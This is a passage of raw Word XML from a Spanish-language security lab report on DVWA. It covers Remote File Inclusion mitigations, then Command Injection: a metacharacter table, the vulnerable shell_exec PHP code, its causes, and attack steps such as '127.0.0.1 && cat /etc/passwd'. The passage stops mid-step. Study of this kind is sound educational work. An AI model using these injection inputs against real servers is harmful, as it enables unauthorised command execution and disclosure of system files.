      <w:tr w:rsidR="00AE5F76" w14:paraId="5C78E50A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B453CB1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>OWASP Top 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A363416" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A05:2021 – Security Misconfiguration / A03:2021 – Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="776A0133" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="24F7A18D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CVSS v4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="4AFD6DCC" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~9.1 Critical — RCE remoto sin autenticación vía RFI</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33114CDB" w14:textId="031AA507" w:rsidR="000E2677" w:rsidRDefault="0095293F">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r w:rsidR="000E2677">
        <w:t>7 Impacto</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30091C6C" w14:textId="31FAEAF7" w:rsidR="00AE5F76" w:rsidRDefault="0095293F">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r w:rsidR="000E2677">
        <w:t xml:space="preserve">8. </w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>Propuesta de mitigación</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6894172D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Lista blanca de archivos permitidos: solo incluir valores que pertenezcan a un conjunto predefinido.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1449FF2E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$allowed = ['include1.php', 'include2.php'];</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>if (in_array($_GET['page'], $allowed)) {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    include($_GET['page']);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CF356A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Deshabilitar allow_url_include en php.ini: allow_url_include = Off</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29411C12" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Sanitizar rutas: eliminar ../, ..\, secuencias %00 y %2e%2e.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DE9C0E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Principio de mínimo privilegio: el proceso web no debe poder leer fuera del webroot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1415A3CC" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>WAF: bloquear patrones de path traversal en URLs entrantes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D730D9" w14:textId="7DDDE257" w:rsidR="00AE5F76" w:rsidRDefault="009E1026" w:rsidP="005D77FE">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="CCCCCC"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>───────────────────────────────────────────────────────────────────</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E79DB6A" w14:textId="43B19E8C" w:rsidR="00AE5F76" w:rsidRPr="005D77FE" w:rsidRDefault="009E1026" w:rsidP="000B4D96">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Vulnerabilidad 6 — Command Injection (Inyección de Comandos OS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2613654F" w14:textId="177B1B60" w:rsidR="000B4D96" w:rsidRPr="000B4D96" w:rsidRDefault="000B4D96" w:rsidP="000B4D96">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2. Descripción de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6075E781" w14:textId="649DDBE4" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t xml:space="preserve">La inyección de comandos de sistema operativo (OS Command Injection) ocurre cuando una aplicación construye una llamada a la shell del sistema usando datos controlables por el usuario, </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>sin neutralizar los metacaracteres que el intérprete de comandos utiliza para separar o encadenar instrucciones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F50966" w14:textId="1741CCAC" w:rsidR="000B4D96" w:rsidRDefault="009E1026">
      <w:r>
        <w:t xml:space="preserve">A diferencia de SQL Injection (que afecta al motor de base de datos), Command Injection afecta directamente al sistema operativo del servidor. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C13E181" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Metacaracteres de shell más frecuentes en ataques:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2877"/>
        <w:gridCol w:w="2877"/>
        <w:gridCol w:w="2876"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="690F1B6C" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="61BEE1CF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Metacaracter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="72E9BB21" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Comportamiento</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="0BBCE7A3" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ejemplo de inyección</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="49E1BCB1" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="039BFBD1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="121844E4" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ejecuta el segundo comando siempre</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="481788A3" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>127.0.0.1 ; id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="2E1ED828" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7410A638" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&amp;&amp;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="3DC59CF8" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ejecuta el segundo solo si el primero tuvo éxito</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="61239BDA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>127.0.0.1 &amp;&amp; whoami</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="78FD4E56" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="705747D3" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>||</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F6B6CED" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ejecuta el segundo solo si el primero falló</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="373EA2EE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>fallo || id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="6AB27EDA" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="28B33D31" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>|</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7F3F55B1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Pipe: salida del primero es input del segundo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="3BC75FC9" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>127.0.0.1 | cat /etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="1E829812" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5CB9736B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>`cmd`/$()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="518DC43C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sustitución de comandos: ejecuta y sustituye por su salida</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="46AE0F02" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>`id`  o  $(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1310A3F0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="006DE6EA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fragmento de código vulnerable (DVWA nivel Low):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13403F61" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// El parámetro 'ip' se concatena directamente al comando del SO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>$target = $_REQUEST['ip'];</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>$cmd = shell_exec('ping -c 4 ' . $target);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>echo $cmd;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>// Sin escapeshellarg(), sin regex de IP, sin lista blanca</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CC31B3" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="0E9B6D9E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>CWE-78 (OS Command Injection) es consistentemente clasificada en OWASP Top 10 Inside A03:2021 como una de las vulnerabilidades de mayor impacto real. Históricamente, vulnerabilidades como Shellshock (CVE-2014-6271) demostraron que un server Bash mal configurado podía comprometerse con una sola petición HTTP maliciosa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B89810E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La funcionalidad de "ping" de DVWA toma una dirección IP del usuario y la pasa a shell_exec() concatenada como argumento. Dado que PHP no escapa los metacaracteres de shell ni restringe el formato del input, el atacante puede encadenar comandos adicionales usando separadores como ; o &amp;&amp;, logrando ejecución arbitraria de comandos con los privilegios del proceso web del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1528D3D3" w14:textId="3C26E4D8" w:rsidR="00AE5F76" w:rsidRDefault="000B4D96">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>6.</w:t>
      </w:r>
      <w:r w:rsidR="00E2575F">
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Causas de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A53021E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a. Ausencia de validaciones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388827AA" w14:textId="53B000E7" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>No se verifica que $target tenga formato de dirección IPv4. Cualquier cadena, incluidas las que contienen metacaracteres de shell, es aceptada y pasada a shell_exec().</w:t>
      </w:r>
      <w:r w:rsidR="00224957">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A667993" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>b. Errores de lógica</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107E3155" w14:textId="55AC9FDF" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La aplicación no distingue entre el argumento del comando (dato: la IP) y el comando en sí. Al concatenar directamente, el SO recibe una cadena completa que puede contener múltiples comandos separados por metacaracteres.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54373F01" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c. Manejo inadecuado de entradas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6678DAE2" w14:textId="5A7E206D" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>No se usa escapeshellarg() ni escapeshellcmd(). Los metacaracteres ; &amp;&amp; || | ` $() no son eliminados ni escapados antes de construir el comando del SO.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AEDD73" w14:textId="77777777" w:rsidR="00FE2535" w:rsidRDefault="00FE2535"/>
    <w:p w14:paraId="457201EB" w14:textId="25719C0E" w:rsidR="00AE5F76" w:rsidRDefault="00224957">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>6.4</w:t>
      </w:r>
      <w:r w:rsidR="00015E0E">
        <w:t xml:space="preserve"> y 6.5</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Mecanismo de ataque</w:t>
      </w:r>
      <w:r w:rsidR="00015E0E">
        <w:t xml:space="preserve"> y capturas de pantalla</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t xml:space="preserve"> — Ejecución de comandos arbitrarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCF851D" w14:textId="6E29D3BB" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Objetivo: ejecutar comandos del SO del servidor a través del campo de ping.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D325631" w14:textId="2BE0AFF4" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="00957EE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Paso 1 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r w:rsidR="00957EE6">
        <w:t xml:space="preserve">Validar el comportamiento normal de la pagina </w:t>
      </w:r>
      <w:r w:rsidR="00957EE6" w:rsidRPr="00FE2535">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>(imagen 6.1)</w:t>
      </w:r>
      <w:r w:rsidR="00957EE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6FB290" w14:textId="4D3904FA" w:rsidR="00957EE6" w:rsidRDefault="00957EE6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43B59560" wp14:editId="58C681AE">
            <wp:extent cx="5013907" cy="24060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5661" t="4077" r="26015" b="37639"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5062179" cy="2429250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F80B9F2" w14:textId="1896D9AF" w:rsidR="00FE2535" w:rsidRPr="00FE2535" w:rsidRDefault="00FE2535">
      <w:r w:rsidRPr="00FE2535">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Imagen 6.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>Exploración comportamiento pagina</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02402742" w14:textId="63C91296" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="00431D11">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Paso </w:t>
      </w:r>
      <w:r w:rsidR="00957EE6" w:rsidRPr="00431D11">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Inyección con </w:t>
      </w:r>
      <w:r w:rsidR="00431D11">
        <w:t xml:space="preserve">&amp;&amp; </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidR="00957EE6">
        <w:t xml:space="preserve">y commando malicioso podría ser </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D61B4E8" w14:textId="19A4C382" w:rsidR="00957EE6" w:rsidRDefault="00957EE6" w:rsidP="00957EE6">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">127.0.0.1  </w:t>
      </w:r>
      <w:r w:rsidRPr="00957EE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00431D11">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>&amp;&amp; cat /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ED0C25" w14:textId="4E80EEE2" w:rsidR="00957EE6" w:rsidRDefault="00957EE6" w:rsidP="00957EE6">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00957EE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">muestra el contenido del archivo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CdigoHTML"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:t>, que en Linux contiene la lista de usuarios del sistema (nombres de usuario, UID, GID, shell, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777D79C5" w14:textId="435923E6" w:rsidR="00957EE6" w:rsidRDefault="00957EE6" w:rsidP="00957EE6">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">127.0.0.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00431D11">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>; id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3346E381" w14:textId="311C60FD" w:rsidR="00AE5F76" w:rsidRDefault="00957EE6" w:rsidP="00FE2535">
      <w:pPr>
